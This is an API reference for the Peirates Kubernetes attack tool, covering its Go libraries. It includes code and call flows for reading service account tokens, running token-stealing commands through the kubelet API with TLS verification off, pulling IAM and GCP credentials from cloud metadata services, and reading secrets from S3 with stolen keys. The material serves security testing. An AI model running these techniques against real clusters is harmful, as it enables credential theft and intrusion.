# Peirates Go API Reference

Comprehensive overview of Go APIs and libraries used for Kubernetes cluster interactions.

---

## API Architecture Layers

```
┌─────────────────────────────────────────────┐
│  Application Layer (Peirates Core)         │
├─────────────────────────────────────────────┤
│  kubectl Embedded Library                   │
│  (k8s.io/kubectl/pkg/cmd)                   │
├─────────────────────────────────────────────┤
│  Kubernetes Client Libraries                │
│  (k8s.io/client-go, k8s.io/api)            │
├─────────────────────────────────────────────┤
│  HTTP/TLS Layer                             │
│  (net/http, crypto/tls, crypto/x509)       │
├─────────────────────────────────────────────┤
│  Cloud Provider SDKs                        │
│  (AWS SDK, GCP APIs)                       │
├─────────────────────────────────────────────┤
│  System APIs                                │
│  (os, io, net, encoding)                   │
└─────────────────────────────────────────────┘
```

---

## Layer 1: kubectl Embedded Library

### Primary Package

**Import**: `k8s.io/kubectl/pkg/cmd`

**Purpose**: Execute kubectl commands internally without external binary

**Key API**:

```go
import kubectl "k8s.io/kubectl/pkg/cmd"

// Create kubectl command instance
cmd := kubectl.NewDefaultKubectlCommand()

// Execute as standalone (when Peirates runs as kubectl)
cmd.Execute()

// Or construct with custom IOStreams
cmd := kubectl.NewDefaultKubectlCommandWithArgs(
    kubectl.KubectlOptions{
        IOStreams: genericclioptions.IOStreams{
            In:     stdin,
            Out:    stdout,
            ErrOut: stderr,
        },
    }
)
```

**Usage in Peirates**: `kubectl_wrappers.go`

### Command Execution Pattern

```go
// Peirates wrapper layer
func runKubectl(stdin io.Reader, stdout, stderr io.Writer, cmdArgs ...string) error {
    cmd := exec.Cmd{
        Path:   "/proc/self/exe",
        Args:   append([]string{"kubectl"}, cmdArgs...),
        Stdin:  stdin,
        Stdout: stdout,
        Stderr: stderr,
    }
    return cmd.Start()
}
```

**Constructed Commands**:
```
kubectl --server=<API> --token=<JWT> --certificate-authority=<CA> get pods
kubectl --server=<API> --client-certificate=<CERT> --client-key=<KEY> exec -it <pod> -- /bin/sh
kubectl --server=<API> --insecure-skip-tls-verify=true create -f <manifest>
```

---

## Layer 2: Kubernetes Client Libraries

### 2.1 Core API Types

**Packages**:
- `k8s.io/api` - Kubernetes resource definitions
- `k8s.io/apimachinery` - Runtime schemas, metadata
- `k8s.io/client-go` - Kubernetes API clients

**Used For**: Type definitions, API object marshaling

### 2.2 Authorization API

**Package**: `k8s.io/api/authorization/v1`

**API Usage** (SelfSubjectAccessReview):

```go
type SelfSubjectAccessReviewQuery struct {
    APIVersion string `json:"apiVersion"`  // "authorization.k8s.io/v1"
    Kind       string `json:"kind"`        // "SelfSubjectAccessReview"
    Spec       SelfSubjectAccessReviewSpec `json:"spec"`
}

type SelfSubjectAccessReviewSpec struct {
    ResourceAttributes SelfSubjectAccessReviewResourceAttributes `json:"resourceAttributes"`
}

type SelfSubjectAccessReviewResourceAttributes struct {
    Group     string `json:"group,omitempty"`
    Resource  string `json:"resource"`   // "pods", "secrets", etc.
    Verb      string `json:"verb"`       // "create", "get", "list", etc.
    Namespace string `json:"namespace,omitempty"`
}
```

**Request**:
```http
POST /apis/authorization.k8s.io/v1/selfsubjectaccessreviews
Authorization: Bearer <token>
Content-Type: application/json

{
  "apiVersion": "authorization.k8s.io/v1",
  "kind": "SelfSubjectAccessReview",
  "spec": {
    "resourceAttributes": {
      "verb": "create",
      "resource": "pods",
      "namespace": "default"
    }
  }
}
```

**Response**:
```json
{
  "status": {
    "allowed": true
  }
}
```

**Peirates Function**: `kubectlAuthCanI()` in `kubectl_wrappers.go`

### 2.3 CLI Runtime

**Package**: `k8s.io/cli-runtime`

**Usage**: Command-line option handling, kubeconfig parsing

---

## Layer 3: HTTP/TLS Primitives

### 3.1 HTTP Client

**Package**: `net/http`

**API Pattern**:

```go
// Create request
req, err := http.NewRequest(method, url, body)

// Add headers
req.Header.Add("Authorization", "Bearer " + token)
req.Header.Add("Content-Type", "application/json")

// Configure client
client := &http.Client{
    Timeout: 5 * time.Second,
}

// Execute
resp, err := client.Do(req)
defer resp.Body.Close()

// Read response
body, err := io.ReadAll(resp.Body)
```

**Peirates Usage**: `http_utils.go` - `DoHTTPRequestAndGetBody()`, `GetRequest()`

### 3.2 TLS Configuration

**Packages**: `crypto/tls`, `crypto/x509`

#### TLS with CA Certificate

```go
import (
    "crypto/tls"
    "crypto/x509"
)

// Load CA certificate
caCert, err := os.ReadFile(caCertPath)
caCertPool := x509.SystemCertPool()
caCertPool.AppendCertsFromPEM(caCert)

// Configure TLS
tlsConfig := &tls.Config{
    RootCAs: caCertPool,
}

// Create transport
transport := &http.Transport{
    TLSClientConfig: tlsConfig,
}

client := &http.Client{Transport: transport}
```

#### TLS Skip Verification (Attack Mode)

```go
tlsConfig := &tls.Config{
    InsecureSkipVerify: true,  // Bypass certificate validation
}

transport := &http.Transport{
    TLSClientConfig: tlsConfig,
}

client := &http.Client{Transport: transport}
```

**Used For**:
- Kubernetes API requests (with CA cert)
- Kubelet API exploitation (skip verify)
- AWS S3 requests (skip verify, pod lacks CA store)

**Peirates Function**: `DoHTTPRequestAndGetBody()` in `http_utils.go`

### 3.3 URL Encoding

**Package**: `net/url`

```go
import "net/url"

// URL-encode parameters
data := url.Values{}
data.Set("cmd", "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
encodedData := data.Encode()

// POST with form data
req, _ := http.NewRequest("POST", kubeletURL, strings.NewReader(encodedData))
req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
```

**Used For**: Kubelet API command execution

---

## Layer 4: JSON Marshaling

**Package**: `encoding/json`

### Kubernetes API Requests

```go
// Marshal query to JSON
query := SelfSubjectAccessReviewQuery{...}
queryJSON, err := json.Marshal(query)

// Send to API
req, _ := http.NewRequest("POST", apiURL, bytes.NewReader(queryJSON))

// Unmarshal response
var response SelfSubjectAccessReviewResponse
json.Unmarshal(responseJSON, &response)
```

**Peirates Function**: `DoKubernetesAPIRequest()` in `http_utils.go`

### AWS Metadata API Response

```go
type AWSCredentials struct {
    AccessKeyId     string `json:"AccessKeyId"`
    SecretAccessKey string `json:"SecretAccessKey"`
    SessionToken    string `json:"Token"`
}

// Parse IMDS response
var credentials AWSCredentials
json.Unmarshal(body, &credentials)
```

**Peirates Function**: `PullIamCredentialsFromAWS()` in `aws.go`

---

## Layer 5: Cloud Provider SDKs

### 5.1 AWS SDK for Go

**Package**: `github.com/aws/aws-sdk-go`

**Sub-packages**:
- `aws` - Core AWS types
- `aws/session` - Session management
- `aws/credentials` - Credential providers
- `service/s3` - S3 client
- `service/sts` - STS client

#### S3 Client

```go
import (
    "github.com/aws/aws-sdk-go/aws"
    "github.com/aws/aws-sdk-go/aws/credentials"
    "github.com/aws/aws-sdk-go/aws/session"
    "github.com/aws/aws-sdk-go/service/s3"
)

// Create session with stolen credentials
sess, err := session.NewSession(&aws.Config{
    Region: aws.String("us-east-1"),
    Credentials: credentials.NewStaticCredentials(
        accessKeyId,
        secretAccessKey,
        sessionToken,
    ),
})

// Create S3 client
svc := s3.New(sess)

// List buckets
result, err := svc.ListBuckets(nil)
for _, bucket := range result.Buckets {
    fmt.Println(*bucket.Name)
}

// List objects in bucket
resp, err := svc.ListObjectsV2(&s3.ListObjectsV2Input{
    Bucket: aws.String(bucketName),
})
for _, item := range resp.Contents {
    fmt.Println(*item.Key)
}

// Get object
obj, err := svc.GetObject(&s3.GetObjectInput{
    Bucket: aws.String(bucket),
    Key:    aws.String(key),
})
body, _ := io.ReadAll(obj.Body)
```

**Peirates Functions**: `StartS3Session()`, `ListAWSBuckets()`, `KopsAttackAWS()` in `aws.go`

#### STS Client (AssumeRole)

```go
import "github.com/aws/aws-sdk-go/service/sts"

// Create STS client
svc := sts.New(sess)

// Assume role
result, err := svc.AssumeRole(&sts.AssumeRoleInput{
    RoleArn:         aws.String("arn:aws:iam::123456789012:role/AdminRole"),
    RoleSessionName: aws.String("peirates-session"),
})

// Extract temporary credentials
newCreds := AWSCredentials{
    AccessKeyId:     *result.Credentials.AccessKeyId,
    SecretAccessKey: *result.Credentials.SecretAccessKey,
    SessionToken:    *result.Credentials.SessionToken,
}
```

**Peirates Function**: `AWSSTSAssumeRole()` in `aws.go`

### 5.2 GCP APIs (HTTP-based)

No official SDK used - direct HTTP calls to metadata API.

**Metadata API Endpoints**:

```go
// Token endpoint
url := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
req.Header.Set("Metadata-Flavor", "Google")

// kube-env endpoint
url := "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env"
req.Header.Set("Metadata-Flavor", "Google")
```

**Peirates Functions**: `GetGCPBearerTokenFromMetadataAPI()`, `attackKubeEnvGCP()` in `gcp.go`

---

## Layer 6: Filesystem Operations

### 6.1 File I/O

**Package**: `os`, `io`, `io/ioutil`

#### Read Files

```go
import "os"

// Read entire file
data, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
token := string(data)

// Read with os.Open
file, err := os.Open("/var/lib/kubelet/kubeconfig")
defer file.Close()
content, err := io.ReadAll(file)
```

**Peirates Usage**: 
- `ImportPodServiceAccountToken()` - Read SA token
- `gatherPodCredentials()` - Scan pod filesystems
- `checkForNodeCredentials()` - Read kubelet configs

#### Write Files

```go
// Create temporary file
tmpFile, err := os.CreateTemp("/tmp", "peirates-*.yaml")
defer os.Remove(tmpFile.Name())

// Write content
io.WriteString(tmpFile, manifestContent)
tmpFile.Sync()
```

**Used For**: Temporary manifest files, cert files

#### Directory Listing

```go
// List directory
dir, err := os.Open("/var/lib/kubelet/pods")
entries, err := dir.Readdirnames(-1)
for _, entry := range entries {
    // Process each pod directory
}
```

**Peirates Function**: `gatherPodCredentials()` in `config.go`

### 6.2 Environment Variables

**Package**: `os`

```go
// Read Kubernetes environment variables
apiHost := os.Getenv("KUBERNETES_SERVICE_HOST")
apiPort := os.Getenv("KUBERNETES_SERVICE_PORT")
apiServer := "https://" + apiHost + ":" + apiPort
```

**Peirates Function**: `ImportPodServiceAccountToken()` in `config.go`

---

## Layer 7: Encoding/Decoding

### 7.1 Base64

**Package**: `encoding/base64`

```go
import "encoding/base64"

// Decode service account token from secret
encodedToken := secret.Data["token"]
token, err := base64.StdEncoding.DecodeString(encodedToken)

// Decode JWT payload
parts := strings.Split(jwt, ".")
payload, err := base64.RawStdEncoding.DecodeString(parts[1])
```

**Peirates Usage**: JWT decoding, kubeconfig parsing, S3 object decoding

### 7.2 YAML

**Package**: `gopkg.in/yaml.v3`

```go
import "gopkg.in/yaml.v3"

// Parse kubeconfig
var config KubeConfig
yaml.Unmarshal(fileContent, &config)

// Access credentials
clientCert := config.Users[0].User.ClientCertificateData
clientKey := config.Users[0].User.ClientKeyData
```

**Peirates Function**: `checkForNodeCredentials()` in `config.go`

---

## Layer 8: Network Utilities

### 8.1 Interface Discovery

**Package**: `net`

```go
import "net"

// Get specific interface IP
iface, err := net.InterfaceByName("eth0")
addrs, err := iface.Addrs()
for _, addr := range addrs {
    ipNet := addr.(*net.IPNet)
    if !ipNet.IP.IsLoopback() && ipNet.IP.To4() != nil {
        return ipNet.IP.String()
    }
}

// List all interfaces
ifaces, err := net.Interfaces()
for _, iface := range ifaces {
    addrs, _ := iface.Addrs()
    // Process addresses
}
```

**Peirates Functions**: `GetMyIPAddress()`, `GetMyIPAddressesNative()` in `http_utils.go`

### 8.2 TCP Dialer

```go
import (
    "net"
    "time"
)

// Port scanning
conn, err := net.DialTimeout("tcp", 
    targetIP + ":" + strconv.Itoa(port), 
    1 * time.Second)
if err == nil {
    fmt.Printf("Port %d open\n", port)
    conn.Close()
}
```

**Peirates File**: `portscan.go`

### 8.3 DNS Resolution

```go
import "net"

// DNS lookup
addrs, err := net.LookupHost("kubernetes.default.svc.cluster.local")
```

**Peirates File**: `enumerate_dns.go`

---

## Layer 9: Interactive UI

### Readline Library

**Package**: `github.com/ergochat/readline`

```go
import "github.com/ergochat/readline"

// Create readline instance
rl, err := readline.NewEx(&readline.Config{
    Prompt:          "Peirates> ",
    AutoComplete:    completer,
    HistoryFile:     "/tmp/.peirates_history",
})
defer rl.Close()

// Read user input
line, err := rl.Readline()
```

**Peirates File**: `menu.go`

---

## API Call Flow Examples

### Example 1: Check Permissions

```
kubectlAuthCanI("create", "pods")
  ↓
DoKubernetesAPIRequest(cfg, "POST", "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews", query, &response)
  ↓
json.Marshal(query)
  ↓
http.NewRequest("POST", apiURL, bytes.NewReader(queryJSON))
  ↓
req.Header.Add("Authorization", "Bearer " + token)
  ↓
DoHTTPRequestAndGetBody(req, true, false, caPath)
  ↓
client.Do(req) [with TLS config from CA cert]
  ↓
json.Unmarshal(responseJSON, &response)
  ↓
return response.Status.Allowed
```

### Example 2: Execute Command via Kubelet

```
ExecuteCodeOnKubelet()
  ↓
runKubectlSimple(cfg, "get", "nodes", "-o", "json")
  ↓
For each node:
  GetRequest("http://" + nodeIP + ":10255/pods", nil, false)
  ↓
  For each pod:
    url.Values{}.Set("cmd", "cat /var/run/secrets/.../token")
    ↓
    http.NewRequest("POST", "https://" + nodeIP + ":10250/run/...", data)
    ↓
    client.Do(req) [with InsecureSkipVerify: true]
    ↓
    io.ReadAll(resp.Body)
```

### Example 3: AWS S3 Credential Theft

```
KopsAttackAWS()
  ↓
PullIamCredentialsFromAWS()
  ↓
http.Get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
  ↓
json.Unmarshal(body, &credentials)
  ↓
session.NewSession(&aws.Config{Credentials: ...})
  ↓
s3.New(sess, &aws.Config{HTTPClient: client})
  ↓
svc.ListBuckets(nil)
  ↓
For each bucket containing "/secrets/":
  svc.GetObject(&s3.GetObjectInput{...})
  ↓
  base64.StdEncoding.DecodeString(secret.Data)
```

---

## Key Dependencies Summary

**Direct Dependencies** (from go.mod):
- `k8s.io/kubectl` (v0.32.3) - kubectl library
- `github.com/aws/aws-sdk-go` (v1.42.4) - AWS SDK
- `github.com/ergochat/readline` (v0.1.0) - Interactive shell
- `gopkg.in/yaml.v3` (v3.0.1) - YAML parsing

**Transitive Kubernetes Dependencies**:
- `k8s.io/api` (v0.32.3) - API types
- `k8s.io/client-go` (v0.32.3) - Kubernetes client
- `k8s.io/apimachinery` (v0.32.3) - Runtime schemas
- `k8s.io/cli-runtime` (v0.32.3) - CLI utilities

**Standard Library Packages**:
- `net/http` - HTTP client
- `crypto/tls` - TLS configuration
- `crypto/x509` - Certificate handling
- `encoding/json` - JSON marshaling
- `encoding/base64` - Base64 encoding
- `os` - File operations
- `io` - I/O primitives
- `net` - Network utilities

---

## API Security Characteristics

**Authentication Methods**:
1. Bearer Token (JWT) - `Authorization: Bearer <token>`
2. Client Certificate (mTLS) - `--client-certificate`, `--client-key`
3. No Auth (Kubelet port 10255, metadata APIs)

**TLS Modes**:
1. Verified with CA - Kubernetes API (normal)
2. Skip Verification - Kubelet API (attack), AWS S3 (workaround)
3. No TLS - HTTP metadata APIs, Kubelet port 10255

**API Request Patterns**:
1. Through kubectl library - Most K8s operations
2. Direct HTTP - SelfSubjectAccessReview, kubelet, metadata APIs
3. Cloud SDKs - AWS S3/STS operations
4. Filesystem - Local credential gathering

---

## Design Philosophy

**Embedded over External**:
- kubectl library embedded (not subprocess)
- No external AWS CLI required

**Fallback Strategies**:
- IMDSv1 → IMDSv2
- Token auth → Cert auth
- Single context → Try-all contexts

**Security Trade-offs**:
- Skip TLS verification in attack scenarios
- Write temp files for cert-based auth
- No credential validation before use
